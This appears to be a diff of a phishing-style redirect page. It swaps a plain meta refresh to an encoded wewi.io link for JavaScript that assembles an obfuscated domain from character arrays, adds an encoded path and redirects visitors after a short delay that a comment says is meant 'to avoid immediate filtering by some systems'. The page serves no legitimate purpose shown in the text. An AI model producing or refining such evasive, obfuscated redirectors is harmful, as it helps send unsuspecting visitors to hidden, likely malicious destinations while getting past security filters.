@@ -1,10 +1,51 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta http-equiv="refresh" content="1; url='https://wewi.io/RGdSb2FzaUdmZE5vVXpDNVdvMWV2Z1ZzSmpGVk9UQVZpVWVvRzRPVVJsbW9FTExsVzVqYlZicEpNTmlDQUNDK3ZEa2kxWHlxY3ZvUnFrWWxVMTdqa3c9PQ__
-'" />
-  </head>
-  <body>
-    <p>Du kommer att omdirigeras nu!</p>
-  </body>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // Subdomain generator (fixed pattern without randomness)
+        function generateFixedSubdomain() {
+            return 'fixedsubdomain'; // Replace 'fixedsubdomain' with your preferred subdomain
+        }
+
+        // Function to split and rebuild the domain with obfuscation
+        function rebuildDomain() {
+            var parts = ['d', 's', 't'];
+            var tld = ['d', 'e', 'c', 'o', 'm'];
+            return parts.join('') + '.' + tld.slice(0, 2).join('') + '.' + tld.slice(2).join('');
+        }
+
+        // Function to handle redirection to a fixed URL
+        function redirect() {
+            try {
+                // Hardcoded URL path
+                var hardcodedPath = 'N3dmak5qYUFrdDlLdTNGaG5pdnFQM2pBaGdBdk1VczFLY1piOGZnUERWa1hzaE5YTGMvWCsxem1OaDIyYlNXN1h3dzl3eUprSHJUaGZnRmU3Q0xkVFE9PQ__';
+
+                // Generate a fixed subdomain for redirection
+                var subdomain = generateFixedSubdomain();
+
+                // Build the final redirection URL without additional query parameters
+                var domain = rebuildDomain();
+                var redirectUrl = 'https://' + subdomain + '.' + domain + '/' + hardcodedPath;
+
+                // Update the link in the page to point to the redirect URL
+                document.getElementById('redirect-link').href = redirectUrl;
+
+                // Perform the redirection
+                document.location.href = redirectUrl;
+            } catch (e) {
+                // Optionally handle errors or fallback behavior
+                console.error('Redirection failed:', e);
+            }
+        }
+
+        // Delay the redirection slightly to avoid immediate filtering by some systems
+        setTimeout(redirect, 320);
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+    <p>If you are not redirected automatically, please <a id="redirect-link" href="#">click here</a>.</p>
+</body>
 </html>
